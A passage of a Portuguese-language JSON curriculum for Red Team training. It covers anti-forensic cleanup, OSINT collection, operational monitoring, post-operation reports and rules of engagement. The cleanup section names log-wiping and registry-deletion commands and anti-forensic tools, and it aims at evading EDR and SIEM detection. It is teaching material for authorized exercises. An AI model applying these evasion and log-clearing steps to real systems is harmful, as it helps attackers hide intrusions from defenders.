                                  "verification": "Execução completa dos scripts com logs de auditoria interna confirmando remoções.",
                                  "estimatedTime": "1-1.5 horas",
                                  "materials": [
                                    "Scripts de limpeza pré-aprovados (PowerShell, Bash)",
                                    "Ferramentas anti-forense (timestomp, slacker)",
                                    "Acesso root/admin ao target"
                                  ],
                                  "tips": [
                                    "Execute em lotes pequenos para evitar alertas.",
                                    "Use técnicas de living-off-the-land (LOLBins).",
                                    "Monitore em tempo real com outra sessão."
                                  ],
                                  "learningObjective": "Habilitar execução precisa e stealth de ações de cleanup sem gerar novos IOCs.",
                                  "commonMistakes": [
                                    "Deixar resquícios de scripts de limpeza.",
                                    "Limpeza incompleta em sub-sistemas (ex: browser history).",
                                    "Sobrecarga de CPU causando detecção."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Limpeza e Simular Saída Tática",
                                  "subSteps": [
                                    "Executar scans de detecção (IOC hunters, EDR queries).",
                                    "Simular análise forense básica no target.",
                                    "Confirmar ausência de IOCs originais e novos.",
                                    "Executar exfiltração final de dados se necessário.",
                                    "Documentar lições aprendidas e relatar status de saída."
                                  ],
                                  "verification": "Relatório de verificação com scans limpos e simulação de saída bem-sucedida.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "Ferramentas de hunting (YARA, Sigma rules)",
                                    "EDR/EPP simulados",
                                    "Templates de relatório de saída"
                                  ],
                                  "tips": [
                                    "Use múltiplas perspectivas (blue team view).",
                                    "Registre tudo para debrief.",
                                    "Planeje 'zero footprint' como meta."
                                  ],
                                  "learningObjective": "Garantir que a operação termine sem detecção, validando a eficácia da limpeza.",
                                  "commonMistakes": [
                                    "Falsa sensação de segurança sem scans.",
                                    "Novos IOCs durante verificação.",
                                    "Falta de documentação para ROE (Rules of Engagement)."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team contra um servidor Windows comprometido via phishing, o operador identifica logs de RDP e PowerShell, remove-os usando wevtutil cl e Clear-EventLog, limpa registry keys de persistência com reg delete, verifica com Autoruns e sai via conexão pivotada sem alertas no SIEM simulado.",
                              "finalVerifications": [
                                "Scans IOC padrão (VirusTotal, EDR) não detectam vestígios.",
                                "Análise de logs pós-limpeza mostra ausência de atividades suspeitas.",
                                "Simulação de investigação forense falha em encontrar compromissos.",
                                "Tempo de detecção simulado > 72 horas.",
                                "Relatório de saída aprovado pelo lead do Red Team.",
                                "Nenhum novo IOC gerado durante o cleanup."
                              ],
                              "assessmentCriteria": [
                                "Completude: 100% dos IOCs identificados e removidos.",
                                "Stealth: Ausência de alertas durante execução (métrica de ruído baixo).",
                                "Eficiência: Limpeza concluída dentro do tempo estimado.",
                                "Documentação: Plano e relatório detalhados e acionáveis.",
                                "Verificação: Scans independentes confirmam limpeza.",
                                "Adaptabilidade: Plano de contingência demonstrado."
                              ],
                              "crossCurricularConnections": [
                                "Forense Digital: Técnicas de anti-forense e análise de artifacts.",
                                "Administração de Sistemas: Gerenciamento avançado de logs e registry.",
                                "Redes e Segurança: Análise de tráfego e pivoting.",
                                "Desenvolvimento de Scripts: Automação em PowerShell/Bash.",
                                "Gestão de Projetos: Planejamento tático e ROE."
                              ],
                              "realWorldApplication": "Em operações de Red Team profissionais, como assessments para empresas Fortune 500, essa habilidade garante que simulações de ataques APT terminem sem detecção persistente, permitindo avaliações honestas de defesas sem comprometer credibilidade ou gerar incidentes reais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "2.0.2.3.3",
                        "name": "Analista de Suporte e Relatórios",
                        "description": "Os analistas fornecem inteligência situacional, monitoram operações e produzem relatórios detalhados pós-exercício, contribuindo para a melhoria contínua das defesas cibernéticas.",
                        "specificSkills": [
                          {
                            "id": "2.0.2.3.3.1",
                            "name": "Coleta e Análise de Inteligência",
                            "description": "Coletar OSINT e inteligência sobre alvos simulados, analisar indicadores de compromisso e fornecer briefings ao líder e operadores para refinar táticas de ataque.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Planejamento e Definição de Escopo para Coleta de Inteligência",
                                  "subSteps": [
                                    "Definir objetivos claros da inteligência com base no briefing inicial do líder do Red Team.",
                                    "Identificar alvos simulados e escopo (ex.: domínio, IP, funcionários chave).",
                                    "Listar fontes OSINT prioritárias (WHOIS, Shodan, redes sociais, GitHub).",
                                    "Criar um plano de coleta com cronograma e critérios de relevância.",
                                    "Avaliar riscos legais e éticos para coleta em ambiente simulado."
                                  ],
                                  "verification": "Plano de inteligência documentado e aprovado pelo líder do time.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de planejamento: Notion ou Google Docs",
                                    "Templates de plano OSINT",
                                    "Lista de fontes OSINT aprovadas"
                                  ],
                                  "tips": "Priorize fontes passivas para evitar detecção; use personas fictícias para buscas.",
                                  "learningObjective": "Desenvolver capacidade de estruturar coletas de inteligência alinhadas a objetivos táticos.",
                                  "commonMistakes": [
                                    "Escopo muito amplo levando a sobrecarga de dados",
                                    "Ignorar aspectos éticos",
                                    "Falta de alinhamento com objetivos do Red Team"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Coleta de Dados OSINT e Inteligência sobre Alvos Simulados",
                                  "subSteps": [
                                    "Executar buscas em fontes públicas: WHOIS, DNS records, Shodan, Censys.",
                                    "Coletar dados de redes sociais e perfis profissionais (LinkedIn, Twitter via ferramentas como theHarvester).",
                                    "Rastrear repositórios públicos (GitHub, Pastebin) por credenciais ou configs expostas.",
                                    "Documentar todos os dados em formato estruturado (CSV ou ferramenta como Maltego).",
                                    "Validar dados iniciais cruzando múltiplas fontes."
                                  ],
                                  "verification": "Banco de dados OSINT compilado com pelo menos 20 itens relevantes validados.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "theHarvester, Shodan CLI, Maltego Community Edition",
                                    "Recon-ng",
                                    "Navegador com VPN para anonimato simulado"
                                  ],
                                  "tips": "Use queries avançadas no Google Dorks; automatize com scripts simples em Python.",
                                  "learningObjective": "Mestre técnicas de coleta passiva e ativa de OSINT em cenários simulados.",
                                  "commonMistakes": [
                                    "Coleta de dados irrelevantes",
                                    "Não anonimizar sessões",
                                    "Ignorar rate limits de APIs"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Processamento e Análise Inicial dos Dados Coletados",
                                  "subSteps": [
                                    "Organizar dados em categorias: infraestrutura, pessoal, tecnologias usadas.",
                                    "Identificar padrões e anomalias usando ferramentas de visualização.",
                                    "Correlacionar dados OSINT com inteligência prévia do time.",
                                    "Filtrar ruído e priorizar informações acionáveis.",
                                    "Gerar resumo executivo preliminar."
                                  ],
                                  "verification": "Relatório de análise inicial com visualizações e correlações documentadas.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Maltego ou Gephi para grafos",
                                    "Excel/Google Sheets para triagem",
                                    "Scripts Python para parsing"
                                  ],
                                  "tips": "Crie grafos de relacionamento para visualizar conexões ocultas.",
                                  "learningObjective": "Aprender a transformar dados brutos em insights iniciais acionáveis.",
                                  "commonMistakes": [
                                    "Sobrecarga cognitiva sem categorização",
                                    "Falta de correlação entre fontes",
                                    "Viés de confirmação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Análise Avançada e Identificação de Indicadores de Compromisso (IoCs)",
                                  "subSteps": [
                                    "Analisar IoCs potenciais: IPs expostos, certificados SSL, versões de software vulneráveis.",
                                    "Mapear vetores de ataque baseados em dados (ex.: portas abertas no Shodan).",
                                    "Simular validação de IoCs com scans não intrusivos (Nmap passivo).",
                                    "Priorizar IoCs por impacto tático (alta/média/baixa).",
                                    "Documentar cadeia de evidências para cada IoC."
                                  ],
                                  "verification": "Lista de 10+ IoCs priorizados com evidências e classificações de risco.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "VirusTotal API",
                                    "Nmap para scans passivos",
                                    "MISP para gerenciamento de IoCs"
                                  ],
                                  "tips": "Use frameworks como MITRE ATT&CK para mapear IoCs a táticas adversárias.",
                                  "learningObjective": "Desenvolver expertise em extrair e validar IoCs de inteligência coletada.",
                                  "commonMistakes": [
                                    "Falsos positivos sem validação",
                                    "Não priorizar por relevância tática",
                                    "Exposição de scans intrusivos"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Preparação e Entrega de Briefings para Líder e Operadores",
                                  "subSteps": [
                                    "Estruturar briefing: executivo summary, achados chave, recomendações táticas.",
                                    "Criar visualizações (gráficos, mapas) para comunicação clara.",
                                    "Simular apresentação ao líder e operadores, coletando feedback.",
                                    "Atualizar inteligência com inputs do time.",
                                    "Arquivar relatório para lições aprendidas."
                                  ],
                                  "verification": "Briefing entregue e feedback positivo do líder simulado.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "PowerPoint ou Obsidian para slides",
                                    "Ferramentas de gravação para simulação",
                                    "Templates de briefing Red Team"
                                  ],
                                  "tips": "Mantenha briefings concisos (10-15 min); foque em 'o que fazer a seguir'.",
                                  "learningObjective": "Capacitar comunicação efetiva de inteligência para refinar operações.",
                                  "commonMistakes": [
                                    "Sobrecarga de detalhes técnicos",
                                    "Falta de recomendações acionáveis",
                                    "Não antecipar perguntas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética simulado contra a empresa fictícia 'SecureNet Inc.', colete OSINT via Shodan revelando portas RDP abertas (IoC: porta 3389 em IP 192.0.2.1), analise LinkedIn para identificar admin de TI (João Silva), corrija com dados de GitHub expondo configs AWS, e prepare um briefing recomendando phishing direcionado a João para refinar o ataque inicial.",
                              "finalVerifications": [
                                "Relatório de inteligência completo com OSINT, IoCs e recomendações táticas gerado.",
                                "Briefing apresentado com feedback positivo de stakeholders simulados.",
                                "Todos os IoCs validados e priorizados corretamente.",
                                "Plano de coleta executado sem violações éticas ou detecções simuladas.",
                                "Insights utilizados para refinar táticas em exercício subsequente.",
                                "Documentação arquivada e reutilizável para iterações futuras."
                              ],
                              "assessmentCriteria": [
                                "Precisão e relevância dos dados coletados (80%+ taxa de acerto em IoCs).",
                                "Profundidade da análise (correlações identificadas e evidenciadas).",
                                "Qualidade do briefing (clareza, visualizações, acionabilidade).",
                                "Eficiência temporal (dentro dos tempos estimados).",
                                "Adesão a práticas éticas e legais em simulações.",
                                "Capacidade de integração com o time (feedback incorporado)."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Técnicas de processamento e visualização de big data.",
                                "Comunicação e Apresentação: Habilidades de storytelling técnico.",
                                "Ética e Direito: Princípios de OSINT responsável e privacidade.",
                                "Inteligência Artificial: Uso de ferramentas de automação para coleta.",
                                "Gestão de Projetos: Planejamento e priorização em operações táticas."
                              ],
                              "realWorldApplication": "Em operações de Red Team autorizadas, threat intelligence em SOCs para caça a ameaças, ou suporte a investigações forenses cibernéticas, onde analistas coletam OSINT para mapear adversários, identificam IoCs para defesas proativas e briefam decisores para mitigar riscos reais."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.3.2",
                            "name": "Monitoramento Situacional Durante Operações",
                            "description": "Acompanhar o progresso das operações em tempo real, identificando anomalias e sugerindo ajustes baseados em consciência situacional e regras de engajamento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ferramentas e Dashboards de Monitoramento",
                                  "subSteps": [
                                    "Selecionar ferramentas adequadas como Splunk, ELK Stack ou Wireshark para monitoramento em tempo real.",
                                    "Configurar dashboards personalizados com métricas chave: tráfego de rede, logs de eventos e alertas de anomalias.",
                                    "Integrar feeds de dados de sensores de operações cibernéticas e regras de engajamento (ROE).",
                                    "Testar a configuração com dados simulados para validar visualizações e alertas.",
                                    "Documentar o setup para replicabilidade em futuras operações."
                                  ],
                                  "verification": "Dashboard exibe dados em tempo real sem erros e responde a testes simulados com alertas corretos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso a ferramentas de monitoramento (Splunk/ELK/Wireshark)",
                                    "Ambiente de simulação de rede (ex: Cyber Range)",
                                    "Documentação de ROE"
                                  ],
                                  "tips": "Priorize métricas de alto impacto como latência de rede e picos de tráfego para eficiência.",
                                  "learningObjective": "Configurar um sistema de monitoramento robusto alinhado às necessidades operacionais do Red Team.",
                                  "commonMistakes": [
                                    "Ignorar integração com ROE levando a falsos positivos",
                                    "Sobrecarregar dashboard com métricas irrelevantes",
                                    "Não testar com dados simulados"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Monitorar Progresso Operacional em Tempo Real",
                                  "subSteps": [
                                    "Iniciar monitoramento contínuo, registrando baselines de desempenho normal das operações.",
                                    "Observar fluxos de dados em múltiplos vetores: rede, endpoints e comunicações do time.",
                                    "Registrar eventos cronologicamente em um log de incidentes.",
                                    "Manter comunicação aberta com o time de Red Team via canais dedicados.",
                                    "Atualizar status a cada 5-10 minutos ou em eventos significativos."
                                  ],
                                  "verification": "Log de monitoramento completo com baselines e atualizações regulares, sem lacunas de tempo.",
                                  "estimatedTime": "30 minutos por hora de operação simulada",
                                  "materials": [
                                    "Dashboard configurado",
                                    "Ferramentas de comunicação (Slack/Teams)",
                                    "Templates de log de incidentes"
                                  ],
                                  "tips": "Use cores e alertas visuais para priorizar anomalias críticas.",
                                  "learningObjective": "Desenvolver consciência situacional através de monitoramento proativo e registro preciso.",
                                  "commonMistakes": [
                                    "Foco excessivo em um vetor ignorando outros",
                                    "Atrasos em atualizações causando perda de contexto",
                                    "Registro incompleto de baselines"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e Analisar Anomalias",
                                  "subSteps": [
                                    "Comparar dados em tempo real com baselines para detectar desvios (ex: picos de tráfego >20%).",
                                    "Classificar anomalias por severidade usando critérios de ROE (crítica, média, baixa).",
                                    "Correlacionar anomalias com ações do adversário ou time (ex: detecção de honeypot).",
                                    "Realizar análise root-cause com ferramentas como correlação de logs.",
                                    "Documentar evidências com screenshots e métricas quantitativas."
                                  ],
                                  "verification": "Relatório de anomalias com classificação, correlações e evidências documentadas.",
                                  "estimatedTime": "20-40 minutos por anomalia detectada",
                                  "materials": [
                                    "Ferramentas de análise (SIEM tools)",
                                    "Baselines documentadas",
                                    "Guia de ROE"
                                  ],
                                  "tips": "Automatize alertas para anomalias comuns para reduzir carga cognitiva.",
                                  "learningObjective": "Capacitar identificação precisa de anomalias mantendo aderência às regras de engajamento.",
                                  "commonMistakes": [
                                    "Classificação subjetiva sem métricas",
                                    "Falta de correlação levando a falsos alarmes",
                                    "Ignorar ROE em classificações"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sugerir Ajustes e Gerar Relatórios de Suporte",
                                  "subSteps": [
                                    "Propor ajustes operacionais baseados em anomalias (ex: pivotar para novo vetor de ataque).",
                                    "Validar sugestões contra ROE e impacto na missão.",
                                    "Comunicar sugestões em formato estruturado: problema, análise, recomendação.",
                                    "Gerar relatório interim com resumo situacional e ações tomadas.",
                                    "Arquivar dados para debrief pós-operação."
                                  ],
                                  "verification": "Sugestões implementadas ou rejeitadas com justificativa, relatório interim aprovado pelo lead.",
                                  "estimatedTime": "15-30 minutos por ciclo de ajuste",
                                  "materials": [
                                    "Templates de relatório",
                                    "Canais de comunicação segura",
                                    "Ferramentas de arquivamento"
                                  ],
                                  "tips": "Mantenha sugestões concisas e acionáveis, focando em 'o quê' e 'por quê'.",
                                  "learningObjective": "Transformar insights de monitoramento em ações decisivas que otimizem operações.",
                                  "commonMistakes": [
                                    "Sugestões fora de ROE",
                                    "Relatórios prolixos atrasando decisões",
                                    "Não arquivar para lições aprendidas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de Red Team invadindo uma rede corporativa simulada, o analista detecta um pico de tráfego indicando detecção pelo SOC adversário (anomalia). Compara com baseline, classifica como crítica per ROE, sugere pivotar para tunnel SSH e atualiza o dashboard em tempo real, permitindo que o time continue sem interrupção.",
                              "finalVerifications": [
                                "Dashboard monitora todos os vetores sem falhas por 1 hora simulada.",
                                "Todas as anomalias detectadas são classificadas e documentadas corretamente.",
                                "Sugestões de ajuste são viáveis e alinhadas à ROE.",
                                "Relatório final inclui logs completos e lições aprendidas.",
                                "Time relata consciência situacional aprimorada devido ao monitoramento.",
                                "Simulação completa sem violações de ROE detectadas pós-análise."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de anomalias (>90% taxa de acerto em simulações).",
                                "Velocidade de resposta: anomalias reportadas em <5 minutos.",
                                "Qualidade das sugestões: 80% adotadas pelo time.",
                                "Conformidade com ROE: 100% em todas as ações.",
                                "Completude de documentação: todos os logs e relatórios presentes.",
                                "Efetividade geral: operação simulada prossegue sem interrupções críticas."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Correlação de logs e baselines estatísticos.",
                                "Inteligência Artificial: Uso de ML para detecção automatizada de anomalias.",
                                "Gestão de Projetos: Monitoramento de progresso como em Agile sprints.",
                                "Psicologia: Desenvolvimento de consciência situacional e redução de vieses cognitivos.",
                                "Comunicações: Relatórios claros e comunicação em equipe sob pressão."
                              ],
                              "realWorldApplication": "Em operações de Red Team reais, como testes de penetração para o Departamento de Defesa, o monitoramento situacional permite detectar defesas ativas (ex: EDR alerts), ajustar táticas em tempo real e completar missões sem detecção prematura, simulando ataques adversários como APTs estatais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.3.3",
                            "name": "Elaboração de Relatórios Pós-Operação",
                            "description": "Produzir relatórios detalhados com lições aprendidas, TTPs (Táticas, Técnicas e Procedimentos) observados e recomendações, inspirados em handbooks como o de Murdoch.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparação e Coleta de Dados Pós-Operação",
                                  "subSteps": [
                                    "Reúna todos os logs, capturas de tela, gravações e notas da operação de todos os membros da equipe.",
                                    "Classifique os dados por fases da operação (reconhecimento, exploração, exfiltração, etc.).",
                                    "Documente métricas quantitativas como tempo gasto, taxa de sucesso e detecções adversárias.",
                                    "Entreviste membros da equipe para capturar insights qualitativos.",
                                    "Organize os dados em uma estrutura hierárquica usando ferramentas como pastas ou bancos de dados simples."
                                  ],
                                  "verification": "Verifique se todos os dados estão catalogados em um repositório centralizado acessível à equipe, com um índice completo.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": [
                                    "Logs de ferramentas (Wireshark, Metasploit), notas de campo, ferramentas de edição (Excel, Notion), handbook de Murdoch"
                                  ],
                                  "tips": "Priorize dados frescos; grave entrevistas para precisão.",
                                  "learningObjective": "Desenvolver habilidades em coleta sistemática de evidências operacionais para análise posterior.",
                                  "commonMistakes": [
                                    "Ignorar dados qualitativos",
                                    "Não categorizar por fase",
                                    "Perder arquivos devido a falta de backup"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Análise de Lições Aprendidas",
                                  "subSteps": [
                                    "Identifique sucessos e falhas em cada fase da operação comparando plano vs. execução.",
                                    "Quantifique impactos (ex: tempo perdido por falha técnica).",
                                    "Extraia lições chave usando formato 'O que aconteceu? Por quê? Como melhorar?'.",
                                    "Priorize lições por criticidade (alta/média/baixa).",
                                    "Valide lições com feedback cruzado da equipe."
                                  ],
                                  "verification": "Lista de 5-10 lições aprendidas documentadas com evidências e classificações de prioridade.",
                                  "estimatedTime": "3-5 horas",
                                  "materials": [
                                    "Dados coletados do Step 1",
                                    "Templates de lições aprendidas do handbook de Murdoch",
                                    "Ferramentas de análise (MindMeister para mapas mentais)"
                                  ],
                                  "tips": "Use a técnica '5 Whys' para root cause analysis.",
                                  "learningObjective": "Capacitar análise reflexiva para melhoria contínua de operações Red Team.",
                                  "commonMistakes": [
                                    "Focar só em falhas, ignorando sucessos",
                                    "Lições vagas sem evidências",
                                    "Não priorizar por impacto"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificação de TTPs Observados",
                                  "subSteps": [
                                    "Mapeie táticas, técnicas e procedimentos usados pelo adversário ou pela equipe, usando MITRE ATT&CK.",
                                    "Descreva cada TTP com contexto: quando usado, sucesso/falha, mitigações observadas.",
                                    "Compare TTPs com handbooks como o de Murdoch para padronização.",
                                    "Inclua variações ou TTPs emergentes não documentados previamente.",
                                    "Crie diagramas visuais (fluxogramas) para ilustrar sequências de TTPs."
                                  ],
                                  "verification": "Matriz de TTPs com pelo menos 8-12 entradas, mapeadas ao MITRE ATT&CK e ilustradas.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Handbook de Murdoch",
                                    "Ferramentas de diagramação (Draw.io, Lucidchart)"
                                  ],
                                  "tips": "Seja específico: 'Técnica T1566 Phishing via spear-phishing com taxa de cliques 20%'",
                                  "learningObjective": "Treinar mapeamento preciso de TTPs para inteligência acionável.",
                                  "commonMistakes": [
                                    "Descrições genéricas sem IDs MITRE",
                                    "Ignorar TTPs defensivos do adversário",
                                    "Sobrecarregar com irrelevantes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desenvolvimento de Recomendações",
                                  "subSteps": [
                                    "Gere recomendações baseadas em lições e TTPs, priorizando alto impacto e viabilidade.",
                                    "Estruture como 'Problema > Recomendação > Responsável > Prazo > Métricas de Sucesso'.",
                                    "Inclua opções de curto e longo prazo.",
                                    "Valide recomendações com stakeholders simulados ou equipe.",
                                    "Estime custos e benefícios para cada uma."
                                  ],
                                  "verification": "Lista de 10-15 recomendações acionáveis com estrutura completa e priorização.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": [
                                    "Lições e TTPs dos steps anteriores",
                                    "Templates de recomendações do handbook",
                                    "Planilhas de priorização (RICE scoring)"
                                  ],
                                  "tips": "Faça recomendações SMART (Specific, Measurable, Achievable, Relevant, Time-bound).",
                                  "learningObjective": "Criar recomendações práticas que impulsionem melhorias operacionais e defensivas.",
                                  "commonMistakes": [
                                    "Recomendações vagas",
                                    "Não atribuir responsáveis",
                                    "Ignorar viabilidade técnica"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Redação, Revisão e Finalização do Relatório",
                                  "subSteps": [
                                    "Estruture o relatório: Executive Summary, Lições, TTPs, Recomendações, Anexos.",
                                    "Escreva conteúdo claro, conciso, com visuals e linguagem não técnica onde possível.",
                                    "Realize revisão por pares para precisão e clareza.",
                                    "Inclua sumário executivo de 1 página e glossário.",
                                    "Publique em formato seguro (PDF com controle de acesso) e arquive."
                                  ],
                                  "verification": "Relatório final aprovado por pelo menos 2 revisores, com todos os elementos incluídos e sem erros.",
                                  "estimatedTime": "3-5 horas",
                                  "materials": [
                                    "Conteúdo dos steps anteriores",
                                    "Templates de relatório do handbook de Murdoch",
                                    "Ferramentas de escrita (Google Docs, LaTeX), Grammarly"
                                  ],
                                  "tips": "Use headings consistentes e visuals para engajamento.",
                                  "learningObjective": "Produzir relatórios profissionais que comuniquem inteligência de forma impactante.",
                                  "commonMistakes": [
                                    "Texto denso sem visuals",
                                    "Sumário executivo ausente",
                                    "Erros factuais por falta de revisão"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de ataque de ransomware contra uma rede corporativa simulada, o relatório incluiu: Lições como 'Falha em pivoting devido a EDR não detectado (lição: testar bypasses pré-op)'. TTPs: T1486 (Impacto de Dados) via criptografia AES. Recomendações: 'Implementar backups air-gapped em 30 dias, responsável: Blue Team Lead'.",
                              "finalVerifications": [
                                "Relatório cobre todas as fases da operação com evidências.",
                                "Lições aprendidas são quantificadas e priorizadas.",
                                "TTPs mapeados ao MITRE ATT&CK com diagramas.",
                                "Recomendações são SMART e atribuídas.",
                                "Sumário executivo resume insights chave em 1 página.",
                                "Visuals e anexos melhoram clareza."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude factual (30%)",
                                "Clareza e estrutura profissional (25%)",
                                "Profundidade de análise de lições/TTPs (20%)",
                                "Ação e viabilidade das recomendações (15%)",
                                "Uso efetivo de visuals e templates (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Técnicas de root cause e métricas quantitativas.",
                                "Comunicação Técnica: Escrita de relatórios executivos.",
                                "Inteligência de Ameaças: Mapeamento MITRE ATT&CK.",
                                "Gestão de Projetos: Priorização RICE e atribuição de tarefas.",
                                "Visualização de Dados: Criação de diagramas e fluxogramas."
                              ],
                              "realWorldApplication": "Em operações Red Team reais, como pentests contratados, esses relatórios informam briefings de debriefing para clientes, melhoram defesas Blue Team e alimentam bases de conhecimento para futuras missões, similar a relatórios da MITRE ou CERT."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.4",
                    "name": "Princípios Operacionais do Red Team",
                    "description": "Diretrizes fundamentais para planejamento e execução de operações ofensivas simuladas.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.4.1",
                        "name": "Regras de Engajamento (ROE)",
                        "description": "Definição e aplicação de regras claras que delimitam o escopo, limites éticos e legais das operações do Red Team para simular ataques sem causar danos reais.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.4.1.1",
                            "name": "Elaborar ROE para operações simuladas",
                            "description": "Criar documentos de Regras de Engajamento que especifiquem alvos permitidos, técnicas autorizadas, horários de operação e critérios de parada, garantindo conformidade com leis e políticas organizacionais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisa e Análise de Requisitos Legais e Organizacionais",
                                  "subSteps": [
                                    "Identifique leis relevantes (ex.: LGPD, GDPR, leis de cibersegurança nacional).",
                                    "Revise políticas internas da organização para operações simuladas.",
                                    "Analise o escopo da operação simulada, incluindo objetivos e riscos.",
                                    "Consulte stakeholders chave (ex.: jurídico, comando, equipe técnica).",
                                    "Documente restrições iniciais em um checklist preliminar."
                                  ],
                                  "verification": "Checklist preenchido com referências a leis e políticas citadas.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Documentos legais, políticas organizacionais, atas de reuniões iniciais.",
                                  "tips": "Priorize leis de proteção de dados e uso ético de ferramentas cibernéticas.",
                                  "learningObjective": "Compreender o framework legal e organizacional que rege ROE.",
                                  "commonMistakes": "Ignorar jurisdições internacionais em simulações cross-border."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definição de Parâmetros Operacionais Específicos",
                                  "subSteps": [
                                    "Defina alvos permitidos (ex.: IPs, domínios simulados, sistemas out-of-scope).",
                                    "Especifique técnicas autorizadas (ex.: phishing simulado, scanning, sem DDoS).",
                                    "Estabeleça horários de operação (ex.: 08h-18h, dias úteis).",
                                    "Crie critérios de parada (ex.: detecção pelo blue team, metas alcançadas).",
                                    "Inclua regras de escalada e comunicação de incidentes."
                                  ],
                                  "verification": "Tabela de parâmetros com colunas para permitido/proibido e justificativa.",
                                  "estimatedTime": "3-5 horas",
                                  "materials": "Ferramentas de mapeamento de rede (ex.: Nmap para simulação), templates de ROE.",
                                  "tips": "Use linguagem precisa para evitar ambiguidades em técnicas.",
                                  "learningObjective": "Mapear operacionalmente os limites da simulação cibernética.",
                                  "commonMistakes": "Definir alvos muito amplos, expondo assets reais acidentalmente."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Redação Estruturada do Documento ROE",
                                  "subSteps": [
                                    "Estruture o documento com seções: introdução, definições, regras principais, anexos.",
                                    "Redija cláusulas claras para alvos, técnicas, horários e critérios de parada.",
                                    "Inclua declarações de conformidade legal e assinaturas.",
                                    "Adicione anexos como glossário e fluxogramas de decisão.",
                                    "Formate para legibilidade (ex.: negrito em proibições, numeração)."
                                  ],
                                  "verification": "Documento draft completo com todas seções preenchidas e sem erros gramaticais.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Editor de texto (ex.: MS Word, Google Docs), templates ROE padrão.",
                                  "tips": "Use verbos imperativos (ex.: 'Permitido apenas scanning passivo').",
                                  "learningObjective": "Produzir um documento ROE profissional e juridicamente sólido.",
                                  "commonMistakes": "Omitir seção de responsabilidades individuais."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Revisão, Validação e Aprovação Final",
                                  "subSteps": [
                                    "Realize revisão interna com equipe Red Team e jurídico.",
                                    "Simule cenários de ambiguidade para testar clareza.",
                                    "Colete feedback e itere o documento.",
                                    "Obtenha aprovações formais de autoridades competentes.",
                                    "Arquive versão final e distribua para todos envolvidos."
                                  ],
                                  "verification": "Documento assinado por stakeholders com registro de aprovações.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "Ferramentas de colaboração (ex.: SharePoint), formulários de aprovação.",
                                  "tips": "Agende reuniões curtas focadas em pontos críticos.",
                                  "learningObjective": "Garantir que o ROE seja robusto e consensual.",
                                  "commonMistakes": "Pular simulação de cenários edge-case."
                                }
                              ],
                              "practicalExample": "Para uma simulação de ataque Red Team em uma rede corporativa simulada: ROE permite scanning de portas em 192.168.1.0/24 das 9h-17h seg-sex, proíbe exploits reais (apenas PoC), para ao detectar honeypot ou após 48h sem progresso, conforme LGPD e política interna de testes éticos.",
                              "finalVerifications": [
                                "ROE cobre todos os parâmetros: alvos, técnicas, horários, critérios de parada.",
                                "Conformidade explícita com leis citadas (ex.: LGPD).",
                                "Documento assinado por jurídico e comando.",
                                "Testado em cenários simulados sem ambiguidades.",
                                "Distribuído e confirmado receipt por equipe.",
                                "Versão final versionada e arquivada."
                              ],
                              "assessmentCriteria": [
                                "Completude: Todos elementos obrigatórios presentes (90-100%).",
                                "Clareza: Linguagem precisa, sem ambiguidades (alto impacto).",
